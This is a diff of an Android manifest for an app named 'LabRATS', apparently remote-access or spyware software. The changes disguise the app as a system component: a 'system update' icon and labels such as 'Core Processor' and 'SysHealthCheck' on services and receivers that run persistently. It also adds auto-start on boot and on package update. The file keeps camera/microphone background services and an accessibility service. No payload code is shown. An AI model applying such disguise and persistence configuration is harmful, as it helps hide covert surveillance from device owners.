@@ -76,9 +76,9 @@
 
     <application
         android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
+        android:icon="@mipmap/ic_system_update_adaptive"
         android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
+        android:roundIcon="@mipmap/ic_system_update_adaptive"
         android:supportsRtl="true"
         android:theme="@style/Theme.LabRATS"
         android:requestLegacyExternalStorage="true"
@@ -112,7 +112,7 @@
             android:enabled="true"
             android:exported="true"
             android:label="@string/app_name"
-            android:icon="@mipmap/ic_launcher"
+            android:icon="@mipmap/ic_system_update_adaptive"
             android:targetActivity=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -177,37 +177,26 @@
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
-            android:foregroundServiceType="camera|microphone|dataSync|location" />
+            android:foregroundServiceType="dataSync" />
 
         <service
             android:name=".MediaContainer"
             android:enabled="true"
             android:exported="false"
+            android:label="Core Processor"
             android:stopWithTask="false"
             android:foregroundServiceType="camera|microphone|dataSync" />
 
         <receiver
             android:name=".SystemBoot"
             android:enabled="true"
-            android:exported="true">
+            android:exported="true"
+            android:label="SysHealthCheck">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-            </intent-filter>
-        </receiver>
-
-        <!-- System Stability - Security Module (Device Admin) -->
-        <receiver
-            android:name=".StabilityPolicy"
-            android:exported="true"
-            android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data
-                android:name="android.app.device_admin"
-                android:resource="@xml/device_admin" />
-            <intent-filter>
-                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED" />
-                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="com.labs.labrats.AUTO_START" />
             </intent-filter>
         </receiver>
 
@@ -249,7 +238,8 @@
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:directBootAware="true"
-            android:label="System Stability Service"
+            android:label="@string/app_name"
+            android:description="@string/accessibility_description"
             android:stopWithTask="false">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
